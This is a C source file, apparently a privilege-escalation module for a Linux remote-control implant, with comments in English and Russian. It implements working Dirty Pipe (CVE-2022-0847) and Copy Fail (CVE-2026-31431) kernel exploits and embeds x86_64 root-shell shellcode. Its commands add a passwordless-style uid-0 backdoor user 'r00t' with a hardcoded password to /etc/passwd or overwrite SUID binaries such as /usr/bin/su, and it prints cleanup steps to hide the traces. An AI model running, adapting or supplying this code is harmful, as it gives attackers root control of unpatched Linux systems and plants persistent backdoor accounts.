// Privilege escalation commands for Linux beacon.
// Implements CVE-2022-0847 (Dirty Pipe) — overwrite page cache of read-only files.
// Kernel 5.8 <= version < 5.16.11 / 5.15.25 / 5.10.102.
// macOS: эксплойт не применим (нет splice/AF_ALG), возвращаем заглушку.

#include "../core/beacon.h"

#ifdef __APPLE__
#include <string.h>
void cmd_privesc_root(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);
    const char* msg = "[-] privesc: not available on macOS (Linux-only exploit)\n";
    out_write(msg, strlen(msg));
}
#else // Linux

#define _GNU_SOURCE  // splice(), F_GETPIPE_SZ
#include <string.h>

// Вывод строкового литерала — длина считается компилятором, не руками.
// Работает ТОЛЬКО с литералами ("abc"), не с char*.
#define OUT_LIT(s) out_write((s), sizeof(s) - 1)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/wait.h>

#ifndef F_GETPIPE_SZ
#define F_GETPIPE_SZ 1032
#endif

// ---- Dirty Pipe (CVE-2022-0847) --------------------------------------------
// Overwrites page cache of a file at an arbitrary offset.
// The target file can be read-only and owned by root.
//
// Mechanism:
// 1. Create pipe, fill it completely, drain it
//    → all pipe_buffer entries get PIPE_BUF_FLAG_CAN_MERGE
// 2. splice() one byte from target file into pipe
//    → the page from target lands in pipe WITH CAN_MERGE still set
// 3. write() payload to pipe
//    → kernel merges into the SAME page cache page (overwriting the file contents)
//
// The overwrite is in PAGE CACHE only — not on disk.
// Survives until page is evicted or system reboots.

#ifndef PIPE_BUF_SZ
#define PIPE_BUF_SZ 65536  // default pipe capacity (16 pages * 4096)
#endif

// Write `data` (len bytes) into the page cache of `target_fd` at `offset`.
// offset must be > 0 (cannot overwrite first byte — splice needs at least 1 byte).
// Returns 0 on success, -1 on failure.
static int dirty_pipe_write(int target_fd, loff_t offset, const uint8_t* data, size_t len) {
    if (offset == 0) {
        // Cannot overwrite byte 0 — splice needs to consume at least 1 byte from target.
        // Caller should set offset=1 and prepend a dummy byte.
        return -1;
    }

    int pfd[2];
    if (pipe(pfd) < 0) return -1;

    // Get pipe capacity
    long pipe_cap = (long)fcntl(pfd[1], F_GETPIPE_SZ);
    if (pipe_cap <= 0) pipe_cap = PIPE_BUF_SZ;

    // Step 1: fill the pipe completely, then drain — sets PIPE_BUF_FLAG_CAN_MERGE
    char* fill = (char*)bmalloc((size_t)pipe_cap);
    if (!fill) { close(pfd[0]); close(pfd[1]); return -1; }
    memset(fill, 'X', (size_t)pipe_cap);

    ssize_t w = write(pfd[1], fill, (size_t)pipe_cap);
    if (w != pipe_cap) { bfree(fill); close(pfd[0]); close(pfd[1]); return -1; }

    // Drain
    ssize_t r = read(pfd[0], fill, (size_t)pipe_cap);
    if (r != pipe_cap) { bfree(fill); close(pfd[0]); close(pfd[1]); return -1; }
    bfree(fill);

    // Step 2: splice 1 byte from target file at (offset-1) into pipe
    // This puts the target's page into the pipe buffer with CAN_MERGE flag
    loff_t splice_off = offset - 1;
    ssize_t sp = splice(target_fd, &splice_off, pfd[1], NULL, 1, 0);
    if (sp <= 0) {
        close(pfd[0]); close(pfd[1]);
        return -1;
    }

    // Step 3: write our data — kernel will merge into the page cache page
    w = write(pfd[1], data, len);
    close(pfd[0]);
    close(pfd[1]);

    return (w == (ssize_t)len) ? 0 : -1;
}

// ---- Approach 1: Overwrite /etc/passwd to add root-equivalent user ----------
// Adds "r00t::<uid0>:0::/root:/bin/sh\n" line by overwriting at a known offset.
// This is more reliable than overwriting SUID ELF.

static int privesc_passwd(void) {
    // Read current /etc/passwd to find the end
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return -1;

    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return -1; }

    // Read the file to find a good injection point.
    // We'll overwrite starting at the last newline position + 1.
    char* buf = (char*)bmalloc((size_t)st.st_size + 1);
    if (!buf) { close(fd); return -1; }
    ssize_t n = read(fd, buf, (size_t)st.st_size);
    if (n <= 0) { bfree(buf); close(fd); return -1; }
    buf[n] = 0;

    // Find last newline — we'll write our line after it
    ssize_t last_nl = n - 1;
    while (last_nl >= 0 && buf[last_nl] != '\n') last_nl--;
    loff_t inject_off = (loff_t)(last_nl + 1);

    bfree(buf);

    // The line to inject: root-equivalent user with no password
    // Format: username:password:uid:gid:gecos:home:shell
    // Empty password field = passwordless (or use "x" and add to /etc/shadow)
    // MD5-crypt hash for password "Pa$$w0rd" with salt "co2h"
    const char* payload = "r00t:$1$co2h$1m4CNbJuLqyaIZbGp1JO41:0:0::/root:/bin/sh\n";
    size_t payload_len = strlen(payload);

    // Need offset > 0 for dirty_pipe_write; inject_off is typically > 0
    if (inject_off < 1) { close(fd); return -1; }

    int rc = dirty_pipe_write(fd, inject_off, (const uint8_t*)payload, payload_len);
    close(fd);
    return rc;
}

// ---- Approach 2: Overwrite SUID binary with ELF that spawns root shell ------
// Minimal x86_64 ELF: setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL], NULL)

static const uint8_t kRootShellElf[] = {
    // ELF header (first 64 bytes)
    0x7f, 'E', 'L', 'F',           // e_ident: magic
    0x02,                           // EI_CLASS: 64-bit
    0x01,                           // EI_DATA: little-endian
    0x01,                           // EI_VERSION: current
    0x00,                           // EI_OSABI: UNIX
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // padding
    0x02, 0x00,                     // e_type: ET_EXEC
    0x3e, 0x00,                     // e_machine: x86_64
    0x01, 0x00, 0x00, 0x00,         // e_version: 1
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // e_entry: 0x400078
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // e_phoff: 64
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // e_shoff: 0
    0x00, 0x00, 0x00, 0x00,         // e_flags
    0x40, 0x00,                     // e_ehsize: 64
    0x38, 0x00,                     // e_phentsize: 56
    0x01, 0x00,                     // e_phnum: 1
    0x00, 0x00,                     // e_shentsize
    0x00, 0x00,                     // e_shnum
    0x00, 0x00,                     // e_shstrndx

    // Program header (56 bytes)
    0x01, 0x00, 0x00, 0x00,         // p_type: PT_LOAD
    0x05, 0x00, 0x00, 0x00,         // p_flags: PF_R | PF_X
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // p_offset: 0
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // p_vaddr: 0x400000
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // p_paddr: 0x400000
    0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // p_filesz: 0xc0
    0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // p_memsz: 0xc0
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // p_align: 0x1000

    // Code at offset 0x78 (entry point = 0x400078)
    // setuid(0):  mov rax, 105; xor rdi, rdi; syscall
    0x48, 0xc7, 0xc0, 0x69, 0x00, 0x00, 0x00,  // mov rax, 105
    0x48, 0x31, 0xff,                            // xor rdi, rdi
    0x0f, 0x05,                                  // syscall

    // setgid(0):  mov rax, 106; xor rdi, rdi; syscall
    0x48, 0xc7, 0xc0, 0x6a, 0x00, 0x00, 0x00,  // mov rax, 106
    0x48, 0x31, 0xff,                            // xor rdi, rdi
    0x0f, 0x05,                                  // syscall

    // execve("/bin/sh", ["/bin/sh", NULL], NULL)
    0x48, 0x31, 0xd2,                            // xor rdx, rdx (envp=NULL)
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // movabs rbx, "/bin/sh\0"
    0x53,                                        // push rbx
    0x48, 0x89, 0xe7,                            // mov rdi, rsp (path)
    0x50,                                        // push rax (NULL)
    0x57,                                        // push rdi (ptr to "/bin/sh")
    0x48, 0x89, 0xe6,                            // mov rsi, rsp (argv)
    0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00,  // mov rax, 59 (execve)
    0x0f, 0x05,                                  // syscall

    // exit(0) fallback
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,  // mov rax, 60
    0x48, 0x31, 0xff,                            // xor rdi, rdi
    0x0f, 0x05,                                  // syscall
};

static int privesc_suid(const char* target) {
    int fd = open(target, O_RDONLY);
    if (fd < 0) return -1;

    // Verify it's SUID root
    struct stat st;
    if (fstat(fd, &st) < 0 || !(st.st_mode & S_ISUID) || st.st_uid != 0) {
        close(fd);
        return -1;
    }

    // Overwrite at offset 1 (skip first byte to work around splice requirement)
    // We write the ELF starting from byte 1, so we prepend the actual ELF byte[1]
    int rc = dirty_pipe_write(fd, 1, kRootShellElf + 1, sizeof(kRootShellElf) - 1);
    close(fd);
    if (rc != 0) return -1;

    // Запуск перезаписанного SUID. Шеллкод делает execve("/bin/sh",["/bin/sh",NULL],NULL),
    // поэтому аргументы -c теряются. Подаём команду через stdin.
    int in_pfd[2], out_pfd[2];
    if (pipe(in_pfd) < 0) return -1;
    if (pipe(out_pfd) < 0) { close(in_pfd[0]); close(in_pfd[1]); return -1; }

    pid_t pid = fork();
    if (pid < 0) {
        close(in_pfd[0]); close(in_pfd[1]);
        close(out_pfd[0]); close(out_pfd[1]);
        return -1;
    }

    if (pid == 0) {
        close(in_pfd[1]); close(out_pfd[0]);
        dup2(in_pfd[0], STDIN_FILENO);
        dup2(out_pfd[1], STDOUT_FILENO);
        dup2(out_pfd[1], STDERR_FILENO);
        close(in_pfd[0]); close(out_pfd[1]);
        execl(target, target, (char*)NULL);
        _exit(127);
    }

    close(in_pfd[0]); close(out_pfd[1]);
    write(in_pfd[1], "id\nexit\n", 8);
    close(in_pfd[1]);

    char buf[256];
    ssize_t nr = read(out_pfd[0], buf, sizeof(buf) - 1);
    close(out_pfd[0]);
    waitpid(pid, NULL, 0);

    if (nr > 0) {
        buf[nr] = 0;
        if (strstr(buf, "uid=0")) return 0;  // got root
    }
    return -1;
}

// ---- Approach 3: CVE-2026-31431 (Copy Fail) --------------------------------
// Реализация: tgies/copy-fail-c (LGPL-2.1 / MIT).
// In-place AEAD-decrypt в algif_aead.c: splice'd page-cache страницы
// используются одновременно как src и dst, и 4 байта перезаписываются
// ДО проверки auth-тега. Ядра 4.14–6.19.12.
//
// Преимущества перед Dirty Pipe (CVE-2022-0847):
//   + Ядра 4.14+ (Dirty Pipe: только 5.8–5.16.10)
//   + Запись по смещению 0 (Dirty Pipe: минимум 1)
//   + Детерминистично — нет гонки
//   - 4 байта за операцию
//   - Нужен модуль algif_aead + authencesn

#include "copyfail.h"   // patch_chunk() из copy-fail-c

#include <sys/socket.h>
#include <linux/if_alg.h>

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

// Проверка доступности authencesn на данном ядре
static int copyfail_available(void) {
    int afd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (afd < 0) return 0;

    struct sockaddr_alg sa = { .salg_family = AF_ALG };
    memcpy(sa.salg_type, "aead", 5);
    memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))",
           sizeof "authencesn(hmac(sha256),cbc(aes))");

    int ok = (bind(afd, (struct sockaddr*)&sa, sizeof(sa)) == 0);
    close(afd);
    return ok;
}

// Самотест: временный файл, patch_chunk, проверка
static int copyfail_selftest(void) {
    OUT_LIT("[*] Copy Fail self-test on temp file...\n");

    char tmppath[] = "/tmp/.co2h_cftest_XXXXXX";
    int fd = mkstemp(tmppath);
    if (fd < 0) { OUT_LIT("  [!] mkstemp failed\n"); return -1; }

    uint8_t pattern[256];
    memset(pattern, 'A', sizeof(pattern));
    if (write(fd, pattern, sizeof(pattern)) != (ssize_t)sizeof(pattern)) {
        OUT_LIT("  [!] write temp failed\n");
        close(fd); unlink(tmppath); return -1;
    }
    close(fd);

    fd = open(tmppath, O_RDONLY);
    if (fd < 0) { OUT_LIT("  [!] reopen failed\n"); unlink(tmppath); return -1; }

    uint8_t payload[4] = { 'T', 'E', 'S', 'T' };
    int rc = patch_chunk(fd, 32, payload);
    close(fd);

    if (rc != 0) {
        OUT_LIT("  [!] patch_chunk returned -1\n");
        unlink(tmppath); return -1;
    }

    fd = open(tmppath, O_RDONLY);
    if (fd < 0) { OUT_LIT("  [!] reopen verify failed\n"); unlink(tmppath); return -1; }
    uint8_t verify[256];
    ssize_t rd = read(fd, verify, sizeof(verify));
    close(fd); unlink(tmppath);

    if (rd < 36) { OUT_LIT("  [!] read too short\n"); return -1; }

    char msg[128];
    int n = snprintf(msg, sizeof(msg),
             "  offset 32: was='AAAA' now='%c%c%c%c' (0x%02x%02x%02x%02x)\n",
             verify[32] >= 0x20 && verify[32] <= 0x7e ? verify[32] : '.',
             verify[33] >= 0x20 && verify[33] <= 0x7e ? verify[33] : '.',
             verify[34] >= 0x20 && verify[34] <= 0x7e ? verify[34] : '.',
             verify[35] >= 0x20 && verify[35] <= 0x7e ? verify[35] : '.',
             verify[32], verify[33], verify[34], verify[35]);
    out_write(msg, (size_t)n);

    if (verify[32] == 'T' && verify[33] == 'E' &&
        verify[34] == 'S' && verify[35] == 'T') {
        OUT_LIT("  [+] PASS\n");
        return 0;
    }
    OUT_LIT("  [-] FAIL\n");
    return -1;
}

// Copy Fail: перезапись SUID-бинарника ELF-шеллкодом (4 байта за итерацию)
static int privesc_copyfail_suid(const char* target) {
    int fd = open(target, O_RDONLY);
    if (fd < 0) { OUT_LIT("[-] open() failed\n"); return -1; }

    struct stat st;
    if (fstat(fd, &st) < 0) { OUT_LIT("[-] fstat() failed\n"); close(fd); return -1; }
    if (!(st.st_mode & S_ISUID)) { OUT_LIT("[-] not SUID\n"); close(fd); return -1; }
    if (st.st_uid != 0) { OUT_LIT("[-] not root-owned\n"); close(fd); return -1; }

    // patch_chunk: splice_len = offset + 4, файл должен быть >= max_offset + 4
    off_t min_sz = (off_t)sizeof(kRootShellElf) + 4;
    if (st.st_size < min_sz) {
        char msg[80];
        int n = snprintf(msg, sizeof(msg), "[-] too small: %ld < %ld\n",
                         (long)st.st_size, (long)min_sz);
        out_write(msg, (size_t)n);
        close(fd); return -1;
    }

    size_t iters = (sizeof(kRootShellElf) + 3) / 4;
    char msg[80];
    int n = snprintf(msg, sizeof(msg), "[*] writing %zu bytes (%zu chunks)...\n",
                     sizeof(kRootShellElf), iters);
    out_write(msg, (size_t)n);

    int rc = 0;
    for (off_t off = 0; (size_t)off < sizeof(kRootShellElf); off += 4) {
        uint8_t window[4] = {0};
        size_t take = sizeof(kRootShellElf) - (size_t)off;
        if (take > 4) take = 4;
        memcpy(window, kRootShellElf + off, take);

        rc = patch_chunk(fd, off, window);
        if (rc != 0) {
            n = snprintf(msg, sizeof(msg), "[-] patch_chunk failed at offset %lld\n",
                         (long long)off);
            out_write(msg, (size_t)n);
            break;
        }
    }
    close(fd);
    if (rc != 0) return -1;

    // Запустить перезаписанный SUID — он теперь наш ELF с setuid(0)+execve("/bin/sh").
    // Шеллкод делает execve("/bin/sh", ["/bin/sh",NULL], NULL) — аргументы из execl
    // теряются. Нужно подать команду через stdin порождённой оболочки.
    int in_pfd[2], out_pfd[2];
    if (pipe(in_pfd) < 0) return -1;
    if (pipe(out_pfd) < 0) { close(in_pfd[0]); close(in_pfd[1]); return -1; }

    pid_t pid = fork();
    if (pid < 0) {
        close(in_pfd[0]); close(in_pfd[1]);
        close(out_pfd[0]); close(out_pfd[1]);
        return -1;
    }
    if (pid == 0) {
        close(in_pfd[1]); close(out_pfd[0]);
        dup2(in_pfd[0], STDIN_FILENO);
        dup2(out_pfd[1], STDOUT_FILENO);
        dup2(out_pfd[1], STDERR_FILENO);
        close(in_pfd[0]); close(out_pfd[1]);
        execl(target, target, (char*)NULL);
        _exit(127);
    }
    close(in_pfd[0]); close(out_pfd[1]);
    // Подать команду — шеллкод запустит /bin/sh, оболочка прочитает из stdin
    write(in_pfd[1], "id\nexit\n", 8);
    close(in_pfd[1]);

    char buf[256];
    ssize_t nr = read(out_pfd[0], buf, sizeof(buf) - 1);
    close(out_pfd[0]);
    waitpid(pid, NULL, 0);

    if (nr > 0) { buf[nr] = 0; if (strstr(buf, "uid=0")) return 0; }
    return -1;
}

// Copy Fail: перезапись /etc/passwd — заменить последнюю строку на uid=0 пользователя.
// patch_chunk() пишет ВНУТРИ существующих байтов page cache (splice_len = offset+4),
// поэтому нельзя дописать после конца файла — только перезаписать существующие байты.
// Стратегия: найти начало последней строки, перезаписать её нашим payload.
static int privesc_copyfail_passwd(void) {
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) { OUT_LIT("[-] open /etc/passwd failed\n"); return -1; }

    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return -1; }

    char* buf = (char*)bmalloc((size_t)st.st_size + 1);
    if (!buf) { close(fd); return -1; }
    ssize_t nr = read(fd, buf, (size_t)st.st_size);
    if (nr <= 0) { bfree(buf); close(fd); return -1; }
    buf[nr] = 0;

    const char* payload = "r00t:$1$co2h$1m4CNbJuLqyaIZbGp1JO41:0:0::/root:/bin/sh\n";
    size_t payload_len = strlen(payload);
    // splice_len для последнего чанка = inject_off + aligned_len,
    // файл должен быть не меньше этого значения
    size_t aligned_len = (payload_len + 3) & ~(size_t)3;  // 52 для 51 байта

    if ((size_t)nr < aligned_len) {
        OUT_LIT("[-] /etc/passwd too small\n");
        bfree(buf); close(fd); return -1;
    }

    // Ищем начало строки, которую перезапишем. Нужно чтобы от inject_off
    // до конца файла было >= aligned_len байт.
    off_t max_off = (off_t)nr - (off_t)aligned_len;
    // Сканируем назад от max_off до ближайшего \n — чтобы встать на начало строки
    off_t inject_off = max_off;
    while (inject_off > 0 && buf[inject_off - 1] != '\n') inject_off--;

    // Проверка: от inject_off до конца файла хватает места?
    if ((off_t)nr - inject_off < (off_t)aligned_len) {
        // Последняя строка слишком длинная, сдвигаемся ещё на строку назад
        if (inject_off > 0) inject_off--;
        while (inject_off > 0 && buf[inject_off - 1] != '\n') inject_off--;
    }

    char msg[128];
    int n = snprintf(msg, sizeof(msg),
             "[*] overwriting at offset %lld (%lld bytes available)\n",
             (long long)inject_off, (long long)(nr - inject_off));
    out_write(msg, (size_t)n);

    bfree(buf);

    int rc = 0;
    for (size_t i = 0; i < payload_len && rc == 0; i += 4) {
        uint8_t window[4] = {0};
        size_t take = payload_len - i;
        if (take > 4) take = 4;
        memcpy(window, payload + i, take);
        rc = patch_chunk(fd, inject_off + (off_t)i, window);
    }
    close(fd);
    return rc;
}

// ---- Command handler -------------------------------------------------------
// Opcode: OP_PRIVESC_ROOT
// Payload: optional "method" string:
//   "passwd"           — overwrite /etc/passwd (Dirty Pipe) (default)
//   "suid <path>"      — overwrite SUID binary (Dirty Pipe)
//   "copyfail <path>"  — overwrite SUID binary (CVE-2026-31431 Copy Fail)
//   "copyfail_passwd"  — overwrite /etc/passwd (CVE-2026-31431 Copy Fail)
//   "copyfail_test"    — самотест Copy Fail на временном файле

void cmd_privesc_root(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    // Check if already root
    if (getuid() == 0 || geteuid() == 0) {
        OUT_LIT("already running as root\n");
        return;
    }

    // Parse method from payload
    char method[256] = "passwd";
    char target[256] = "/usr/bin/su";
    if (t->pay && t->pay_len > 0) {
        size_t n = t->pay_len < sizeof(method)-1 ? t->pay_len : sizeof(method)-1;
        memcpy(method, t->pay, n);
        method[n] = 0;
        // Parse "suid <path>", "copyfail <path>"
        char* space = strchr(method, ' ');
        if (space) {
            *space = 0;
            snprintf(target, sizeof(target), "%s", space + 1);
        }
    }

    int rc = -1;
    char msg[512];

    if (strcmp(method, "passwd") == 0) {
        OUT_LIT("[*] method: overwrite /etc/passwd (dirty pipe)\n");
        rc = privesc_passwd();
        if (rc == 0) {
            OUT_LIT("[+] /etc/passwd modified — added user r00t (uid=0)\n");
            OUT_LIT("[*] credentials: r00t / Pa$$w0rd\n");
            OUT_LIT("[*] run: su r00t\n");

            // Try to spawn root shell directly via su
            int pfd[2];
            if (pipe(pfd) == 0) {
                pid_t pid = fork();
                if (pid == 0) {
                    close(pfd[0]);
                    dup2(pfd[1], STDOUT_FILENO);
                    dup2(pfd[1], STDERR_FILENO);
                    close(pfd[1]);
                    // echo password | su -c "id" r00t
                    execl("/bin/sh", "sh", "-c",
                          "echo '' | su -c 'id' r00t 2>&1", (char*)NULL);
                    _exit(127);
                }
                close(pfd[1]);
                char rbuf[256];
                ssize_t nr = read(pfd[0], rbuf, sizeof(rbuf)-1);
                close(pfd[0]);
                waitpid(pid, NULL, 0);
                if (nr > 0) { rbuf[nr] = 0; out_write(rbuf, (size_t)nr); }
            }
        } else {
            OUT_LIT("[-] dirty pipe failed (kernel may be patched)\n");
        }
    } else if (strcmp(method, "suid") == 0) {
        int n = snprintf(msg, sizeof(msg), "[*] method: overwrite SUID binary %s\n", target);
        out_write(msg, (size_t)n);
        rc = privesc_suid(target);
        if (rc == 0) {
            OUT_LIT("[+] got root!\n");
        } else {
            OUT_LIT("[-] dirty pipe SUID method failed\n");
        }
    } else if (strcmp(method, "copyfail_test") == 0) {
        // Self-test: проверяет работу механизма на временном файле
        OUT_LIT("[*] method: Copy Fail self-test (no privesc)\n");
        if (!copyfail_available()) {
            OUT_LIT("[-] authencesn(hmac(sha256),cbc(aes)) not available\n");
            rc = -1;
        } else {
            rc = copyfail_selftest();
        }
    } else if (strcmp(method, "copyfail") == 0) {
        // CVE-2026-31431: authencesn scratch-write into page cache
        int n = snprintf(msg, sizeof(msg),
                 "[*] method: Copy Fail (CVE-2026-31431) on SUID %s\n", target);
        out_write(msg, (size_t)n);
        OUT_LIT("[*] kernel range: 4.14–6.19.12 (authencesn module)\n");

        if (!copyfail_available()) {
            OUT_LIT("[-] authencesn(hmac(sha256),cbc(aes)) not available\n");
            OUT_LIT("[!] try: modprobe authencesn  (or load algif_aead)\n");
            rc = -1;
        } else {
            // Сначала самотест — убедимся, что механизм вообще работает
            if (copyfail_selftest() != 0) {
                OUT_LIT("[-] self-test failed — kernel may be patched or splice→AF_ALG broken\n");
                rc = -1;
            } else {
                rc = privesc_copyfail_suid(target);
                if (rc == 0) {
                    OUT_LIT("[+] got root via Copy Fail!\n");
                } else {
                    OUT_LIT("[-] Copy Fail SUID overwrite failed (but self-test passed)\n");
                }
            }
        }
    } else if (strcmp(method, "copyfail_passwd") == 0) {
        // CVE-2026-31431: overwrite /etc/passwd via Copy Fail
        OUT_LIT("[*] method: Copy Fail (CVE-2026-31431) on /etc/passwd\n");
        OUT_LIT("[*] kernel range: 4.14–6.19.12 (authencesn module)\n");

        if (!copyfail_available()) {
            OUT_LIT("[-] authencesn(hmac(sha256),cbc(aes)) not available\n");
            OUT_LIT("[!] try: modprobe authencesn  (or load algif_aead)\n");
            rc = -1;
        } else {
            rc = privesc_copyfail_passwd();
            if (rc == 0) {
                OUT_LIT("[+] /etc/passwd page cache modified via Copy Fail\n");
                OUT_LIT("[*] credentials: r00t / Pa$$w0rd\n");
                OUT_LIT("[*] login: su r00t\n");
                OUT_LIT("[*] cleanup: echo 3 > /proc/sys/vm/drop_caches\n");
            } else {
                OUT_LIT("[-] Copy Fail /etc/passwd method failed\n");
            }
        }
    } else {
        OUT_LIT("[-] unknown method; use: passwd | suid <path>"
                " | copyfail <path> | copyfail_passwd | copyfail_test\n");
        rc = -1;
    }

    if (rc != 0) {
        OUT_LIT("[!] privesc failed\n");
    }
}

#endif // !__APPLE__
